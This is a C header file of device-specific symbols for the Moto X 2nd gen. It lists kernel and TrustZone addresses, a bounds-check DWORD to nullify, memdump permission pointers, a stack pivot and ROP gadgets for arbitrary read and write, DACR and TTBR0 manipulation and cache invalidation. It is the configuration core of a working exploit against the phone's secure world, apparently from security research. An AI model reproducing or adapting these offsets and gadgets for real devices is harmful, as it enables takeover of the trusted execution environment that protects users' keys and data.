#ifndef __SYMBOLS_H__
#define __SYMBOLS_H__

// SYMBOLS FOR THE MOTO X 2ND GEN

//The address of the kallsyms_lookup_name function within the Linux kernel
#define KALLSYMS_LOOKUP_NAME (0xC01D2AA4)

//The DWORD that needs to be nullified in order to pass all bounds checks
#define BOUNDS_CHECK_DWORD_ADDRESS (0xFE8236A4)

//The address of the DWORD which is returned when querying fver_get_version with version code 0
#define VERSION_CODE_0_DWORD_ADDRESS (0xFE823D64)
#define BOUNDS_CHECKS_RANGE_START (0xFE82CA10)
#define BOUNDS_CHECKS_RANGE_END (0xFE82CC0C)

//The address of the tzbsp_get_diag function pointer
#define TZBSP_GET_DIAG_POINTER_ADDRESS (0xFE8299B8)

//The address of the tzbsp_security_allows_memdump pointer
#define TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS (0xFE829A38)

//The address of the pivot used
#define MOV_SP_R0_LDMFD_R4_R12_PC (0xFE847C34)

//The address of the BX LR gadget
#define BX_LR (0xFE8097AC+1)

//The address of the "LDR R0, [R0,R1]; BX LR" gadget
#define LDR_R0_R0_R1_BX_LR (0xFE80CE86+1)

//The address of the "STR R0, [R1]; BX LR" gadget
#define STR_R0_R1_BX_LR (0xFE809E66+1)

//The address of the "LDR R1, [R1]; STR R1, [R0]; BX LR" gadget
#define LDR_R1_R1_STR_R1_R0_BX_LR (0xFE808D5A+1)

//The address of the gadget used to set the DACR
#define SET_DACR (0xFE80FCE8)

//The address of the address cache invalidation gadget
#define INVALIDATE_INSTRUCTION_CACHE (0xFE80F858)

//The address of the getTTBR0 gadget
#define GET_TTBR0 (0xFE817BA8)

//The address of the setTTBR0 gadget
#define SET_TTBR0 (0xFE817BB0)

//The address of the memcpy function in TZ
#define TZ_MEMCPY (0xFE8150A4)

#endif
